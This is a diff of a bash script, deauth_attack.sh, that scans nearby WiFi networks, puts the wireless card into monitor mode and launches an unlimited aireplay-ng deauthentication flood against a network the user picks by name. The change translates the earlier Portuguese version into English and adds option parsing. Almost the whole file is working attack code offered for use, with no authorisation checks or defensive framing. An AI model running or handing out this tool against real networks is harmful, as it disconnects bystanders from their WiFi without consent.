@@ -1,71 +1,65 @@
 #!/bin/bash
 
-# contributors: mel, cr0d, rck, kd
+# contributors: mel, cr0d, rck, kd, vm, ... 
 
-if [ "$EUID" -ne 0 ]
-then echo "Necessita root."
-    exit
-fi
-
-mplayer -loop 0 -noconsolecontrols -really-quiet 2>/dev/null keygen.mp3 &
-
-echo "
-
-▓█████▄▓█████▄▄▄      █    ██▄▄▄█████▓██░ ██     ▄▄▄    ▄▄▄█████▄▄▄█████▓▄▄▄      ▄████▄  ██ ▄█▀
-▒██▀ ██▓█   ▒████▄    ██  ▓██▓  ██▒ ▓▓██░ ██▒   ▒████▄  ▓  ██▒ ▓▓  ██▒ ▓▒████▄   ▒██▀ ▀█  ██▄█▒ 
-░██   █▒███ ▒██  ▀█▄ ▓██  ▒██▒ ▓██░ ▒▒██▀▀██░   ▒██  ▀█▄▒ ▓██░ ▒▒ ▓██░ ▒▒██  ▀█▄ ▒▓█    ▄▓███▄░ 
-░▓█▄   ▒▓█  ░██▄▄▄▄██▓▓█  ░██░ ▓██▓ ░░▓█ ░██    ░██▄▄▄▄█░ ▓██▓ ░░ ▓██▓ ░░██▄▄▄▄██▒▓▓▄ ▄██▓██ █▄ 
-░▒████▓░▒████▓█   ▓██▒▒█████▓  ▒██▒ ░░▓█▒░██▓    ▓█   ▓██▒▒██▒ ░  ▒██▒ ░ ▓█   ▓██▒ ▓███▀ ▒██▒ █▄
- ▒▒▓  ▒░░ ▒░ ▒▒   ▓▒█░▒▓▒ ▒ ▒  ▒ ░░   ▒ ░░▒░▒    ▒▒   ▓▒█░▒ ░░    ▒ ░░   ▒▒   ▓▒█░ ░▒ ▒  ▒ ▒▒ ▓▒
-  ░ ▒  ▒ ░ ░  ░▒   ▒▒ ░░▒░ ░ ░    ░    ▒ ░▒░ ░     ▒   ▒▒ ░  ░       ░     ▒   ▒▒ ░ ░  ▒  ░ ░▒ ▒░
-   ░ ░  ░   ░   ░   ▒   ░░░ ░ ░  ░      ░  ░░ ░     ░   ▒   ░       ░       ░   ▒  ░       ░ ░░ ░ 
-      ░      ░  ░    ░  ░  ░             ░  ░  ░         ░  ░                    ░  ░ ░     ░  ░   
-       ░                                                                               ░              
-"
-
-#INTERFACE DA REDE
-INTERFACE="$(sudo route | grep '^default' | grep -o '[^ ]*$')"
-#ARQUIVO TEMPORÁRIO PARA GUARDAR A LISTA DE REDES ENCONTRADAS
-ARQUIVOTMP=$(mktemp)
-
-#RESTAURA A CONEXÃO DO COMPUTADOR
-restaura-conexao()
+usage()
 {
-    echo -n "Restaurando conexão... "
-    sudo airmon-ng stop $INTERFACE"mon" 1> /dev/null
-    sudo service network-manager start 1> /dev/null
-    sleep 5
-    echo "Concluído."
+    echo -e "\nUsage: sudo bash ./deauth_attack.sh <args>"
+    echo -e "\nOptional Arguments:"
+    echo "-n \"<name>\"       : The network name which the attack will be performed"
+    echo "-k                : Plays a nice keygen music while the attack is running"
+#    echo "-s <y,n>          : Don't show the DeAuth messages when performing the attack [Default:n]"
+    echo "-h                : Show this help message"
 }
 
-testa-modo-monitor()
-{
-    echo -n "Testando se o modo monitor está ligado... "
+[ "$EUID" -eq 0 ] || { 
+    usage 
+    echo "NOTE: most of the commands need \"root\"";
+    exit;
+}
 
-    if [ -z "$INTERFACE" ]; then
-        #Se não foi possível pegar a interface de rede, ela está em modo monitor
-        #Pega a interface que está rodando no modo monitor
-        RestauraINTERFACE="$(sudo airmon-ng | grep "mon" | cut -f 2)"
-
-        #Remove o 'mon' da interface de rede e a associa à variavel interface
-        INTERFACE="${RestauraINTERFACE::-3}"
-
-        restaura-conexao
+for CMD in route airmon-ng mktemp iwlist iwconfig wash getopt pkill
+do
+    if [ ! `which $CMD` ]
+    then
+        echo "[ERROR] Missing command/app \"$CMD\". Install it first."
+        echo -e "\nPackages you need to install (Debian, Ubuntu, ...): "
+        echo -e "- aircrack-ng\n- reaver\n- wireless-tools\n- ..."
+        echo -e "\nE.g.: sudo apt-get -y install aircrack-ng reaver wireless-tools"
+        exit
     fi
-    echo "Concluído."
-    echo "Interface de rede: "$INTERFACE
-}
+done
 
-#ESCANEIA AS REDES E MANDA PARA O ARQUIVO TEMPORÁRIO
-escaneia-redes()
+# find WiFi net interface
+INTERFACE=`iwconfig 2> /dev/null | grep 'IEEE 802.11' | awk '{print $1}'`
+# tmp file
+TMP_FILE=$(mktemp)
+
+# stop airmon-ng and start WiFi interface in normal mode
+reset_net_config()
 {
-    echo -n "Escaneando redes... "
-    sudo iwlist $INTERFACE scan | parse-iwl > $ARQUIVOTMP
-    echo "Concluído."
+    echo -n "Re-setting WiFi network configuration ... "
+    airmon-ng stop $INTERFACE"mon" 1> /dev/null
+    service network-manager start 1> /dev/null
+    sleep 5
+    echo "done."
 }
 
-#FUNÇÃO QUE TRANSFORMA O OUTPUT DO COMANDO IWLIST EM ALGO SIMPLES E LEGÍVEL
-parse-iwl()
+check_promiscuous_mode()
+{
+    echo -n "Checking whether promiscuous mode is ON ... "
+    if [ -z "$INTERFACE" ]
+    then
+        NET_IFACE="$(airmon-ng | grep "mon" | cut -f 2)"
+        INTERFACE="${NET_IFACE::-3}"
+        reset_net_config
+    fi
+    echo "done."
+    echo "Network interface: "$INTERFACE
+}
+
+# parse WiFi network names from iwlist's output
+parse_iwl()
 {
     while IFS= read -r line; do
         [[ "$line" =~ \(Channel ]] && {
@@ -79,59 +73,121 @@ parse-iwl()
     done
 }
 
+# find available networks
+scan_networks()
+{
+    echo -n "Scanning WiFi networks ... "
+    iwlist $INTERFACE scan | parse_iwl > $TMP_FILE
+    echo "done."
+}
 
-# TESTANDO SE O PARÂMETRO FOI PASSADO
-if [ $# -eq 0 ]; then
-    testa-modo-monitor
-    escaneia-redes
-    echo ""
-    echo "-- Redes encontradas: --"
-    #Trata os resultados do arquivo temporário para mostrar apenas o nome das redes para o usuário da maneira mais simples e clara
-    #também remove as aspas com o comando sed
-    sudo cat $ARQUIVOTMP | cut -d";" -f1 | sed -e 's/^"//' -e 's/"$//'
-    echo ""
-    echo -n "Digite o nome da rede para atacar: "
-    read REDE
-# TESTANDO SE O USUÁRIO ENTROU COMANDO DE AJUDA
-elif [ "$1" == "-h" ] || [ "$1" == "--help" ]; then     
-    echo "Usage: $0 <INTERFACE>"
-    exit 1
-# USUÁRIO ENTROU A REDE À SER ATACADA COMO PARÂMETRO
-else
-    testa-modo-monitor
-    escaneia-redes
-    REDE=$1
+#Função executa se o usuário passar o nome da rede como parâmetro
+choose_network()
+{
+    echo -e "\n-- networks found: --"
+    # list network names
+    cat $TMP_FILE | cut -d";" -f1 | sed -e 's/^"//' -e 's/"$//'
+    echo -n  -e "\nType in the network name you want to attack: "
+    read NETWORK
+}
+
+#Testa se o nome da rede é válido, evitando futuros erros
+verify_network()
+{
+    echo -n "Verifying network ... "
+    REDE_VALIDA=0
+    IFS=";"
+    while read f1 f2
+    do
+        temp="${f1//\"}"
+        if [ "$temp" == "$NETWORK" ]
+        then
+            REDE_VALIDA=1 
+            break
+        fi
+    done < $TMP_FILE
+    echo "Done."
+}
+
+
+echo "
+
+▓█████▄▓█████▄▄▄      █    ██▄▄▄█████▓██░ ██     ▄▄▄    ▄▄▄█████▄▄▄█████▓▄▄▄      ▄████▄  ██ ▄█▀
+▒██▀ ██▓█   ▒████▄    ██  ▓██▓  ██▒ ▓▓██░ ██▒   ▒████▄  ▓  ██▒ ▓▓  ██▒ ▓▒████▄   ▒██▀ ▀█  ██▄█▒ 
+░██   █▒███ ▒██  ▀█▄ ▓██  ▒██▒ ▓██░ ▒▒██▀▀██░   ▒██  ▀█▄▒ ▓██░ ▒▒ ▓██░ ▒▒██  ▀█▄ ▒▓█    ▄▓███▄░ 
+░▓█▄   ▒▓█  ░██▄▄▄▄██▓▓█  ░██░ ▓██▓ ░░▓█ ░██    ░██▄▄▄▄█░ ▓██▓ ░░ ▓██▓ ░░██▄▄▄▄██▒▓▓▄ ▄██▓██ █▄ 
+░▒████▓░▒████▓█   ▓██▒▒█████▓  ▒██▒ ░░▓█▒░██▓    ▓█   ▓██▒▒██▒ ░  ▒██▒ ░ ▓█   ▓██▒ ▓███▀ ▒██▒ █▄
+▒▒▓  ▒░░ ▒░ ▒▒   ▓▒█░▒▓▒ ▒ ▒  ▒ ░░   ▒ ░░▒░▒    ▒▒   ▓▒█░▒ ░░    ▒ ░░   ▒▒   ▓▒█░ ░▒ ▒  ▒ ▒▒ ▓▒
+░ ▒  ▒ ░ ░  ░▒   ▒▒ ░░▒░ ░ ░    ░    ▒ ░▒░ ░     ▒   ▒▒ ░  ░       ░     ▒   ▒▒ ░ ░  ▒  ░ ░▒ ▒░
+░ ░  ░   ░   ░   ▒   ░░░ ░ ░  ░      ░  ░░ ░     ░   ▒   ░       ░       ░   ▒  ░       ░ ░░ ░ 
+░      ░  ░    ░  ░  ░             ░  ░  ░         ░  ░                    ░  ░ ░     ░  ░   
+░                                                                               ░              
+"
+echo "[DeAuthAttack] BEGIN"
+
+while getopts "n:h:k" opt; do
+    case "$opt" in
+        n)
+            NETWORK=$OPTARG ;;
+        h)
+            usage 
+            exit ;;
+        k)
+            if [ ! `which mplayer` ]
+            then
+                echo "Needs mplayer for playing keygen music. Please install it."
+            else
+                mplayer -loop 0 -noconsolecontrols -really-quiet 2>/dev/null keygen.mp3 &
+            fi
+            ;;
+    esac
+done
+check_promiscuous_mode
+scan_networks
+
+#Se a network não foi setada, não foi passada como parâmetro logo,
+#Devemos pedir para o usuário inserir a rede
+if [ -z ${NETWORK+x} ];
+    then
+        choose_network
 fi
 
+#Verifica se a rede inserida está no arquivo temporário
+verify_network
+if [ $REDE_VALIDA == 0 ]
+then
+    echo "Network not found."
+    exit
+fi
 
+# get the correct channel of the selected network
+CHANNEL="$(cat $TMP_FILE | grep -i "$NETWORK" | cut -d";" -f2)"
+echo "Network channel: $CHANNEL"
 
-# PEGANDO CANAL DA REDE SELECIONADA
-CH="$(sudo cat $ARQUIVOTMP | grep -i "$REDE" | cut -d";" -f2)"
-echo "Canal da rede = $CH"
+echo -n "Starting attack tools ... "
+airmon-ng start $INTERFACE 1> /dev/null
+airmon-ng check kill 1> /dev/null
+echo "done."
 
-
-echo -n "Iniciando ferramentas de ataque... "
-sudo airmon-ng start $INTERFACE 1> /dev/null
-sudo airmon-ng check kill 1> /dev/null
-echo "Concluído."
-
-
-echo -n "Alterando canal da placa de rede para o mesmo do roteador... "
-sudo wash -i $INTERFACE"mon" -c $CH -C -o /dev/null -D 2> /dev/null
-#precisa dar um tempo para o wash alterar o canal em background
+echo -n "Changing the WiFi network channel ... "
+wash -i $INTERFACE"mon" -c $CHANNEL -C -o /dev/null -D 2> /dev/null
+# wait a bit before killing the process
 sleep 2
-sudo pkill wash
-echo "Concluído."
+pkill wash
+echo "done."
 
+echo -n "Starting the attack ... "
+aireplay-ng -0 0 -e "$NETWORK" $INTERFACE"mon" &
 
-echo "Executando ataque..."
-
-aireplay-ng -0 0 -e "$REDE" $INTERFACE"mon" 1> /dev/null &
-trap " " SIGINT 
+# trap <ctrl+c> signal
+trap " " SIGINT
+# wait until the user types <ctrl+c> to end the attacking script
 wait
+# kill the attack process
 kill $!
+# redirect kill's output to /dev/null
 wait $! 2>/dev/null
-echo ""
-echo "Ataque finalizado!"
-restaura-conexao
-echo "Have a nice day!!!"
+
+echo -e "\n[DeAuthAttack] FINISHED"
+
+reset_net_config
